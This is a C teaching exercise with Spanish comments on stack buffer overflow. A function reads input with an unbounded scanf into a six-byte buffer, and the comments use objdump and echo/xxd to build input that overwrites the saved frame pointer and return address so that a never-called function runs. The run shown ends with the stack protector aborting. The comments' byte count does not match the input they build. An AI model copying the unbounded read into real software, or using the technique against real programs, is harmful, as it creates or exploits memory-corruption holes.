#include <stdio.h>

/*Compilar con gcc -o eje pisandopila.c
 * Ejecutando ./eje
 * 
 * Con objdump -d eje, 
 * Analizar:
 *0) El programa desensamblado
 *1) La ubicacion de las funciones void NodeberiaEjecutarseNunca() y void FuncionHola() , la estructura de la pila 
 *2) Revisar la entrada a la funcion FuncionHola()  
        792:   55                      push   %rbp
        793:   48 89 e5                mov    %rsp,%rbp
        796:   48 83 ec 10             sub    $0x10,%rsp
 *3)Recordando el formato little endian, la estructura de la pila
    8bytes direcion de retorno
    8bytes valor guardado al entrar a la funcion de rbp
    6bytes del char[]
    10bytes corrido para alinear
    
    8+8+6=22
    Hay que armar estos 22bytes a medida
    Aramaremos en un archivo los bytes que deben ser enviados al programa
    echo -n 'CUDEK' > raw_input #un string de 6 bytes
    hexdump -C raw_input  #verificacion
    del volcado veo que la dire de rbp es  (objdump_salida.txt ) -> 000000000000076a
    echo -n '6a07000000000000' | xxd -r -p >> raw_input #la envio alverre para respetar endianes
    del volcado veo que la dire de NodeberiaEjecutarseNunca()  es  (objdump_salida.txt ) -> 000000000000077f   
    echo -n '7f07000000000000' | xxd -r -p >> raw_input #la envio alverre para respetar endianes
    hexdump -C raw_input  #verificacion
    
    Impresion hexdump  -C raw_input 
    
00000000  43 55 44 45 4b 6a 07 00  00 00 00 00 00 7f 07 00  |CUDEKj..........|
00000010  00 00 00 00 00                                    |.....|
0000001
    

    Al ejecutar ./eje < raw_input , se obtiene la salida

    
    Hola!!, CUDEKj!
*** stack smashing detected ***: <unknown> terminated
Abortado (`core' generado)

    
 * 
 
 */
void FuncionHola();
void NodeberiaEjecutarseNunca() ;
int main() {
 FuncionHola();
 return 0;
}


void NodeberiaEjecutarseNunca() {
 printf("Nunca Digas Nunca de Nuevo 002\n");
}


void FuncionHola() {
 char buffer[6];
 scanf("%s", buffer);
 printf("Hola!!, %s!\n", buffer);
}
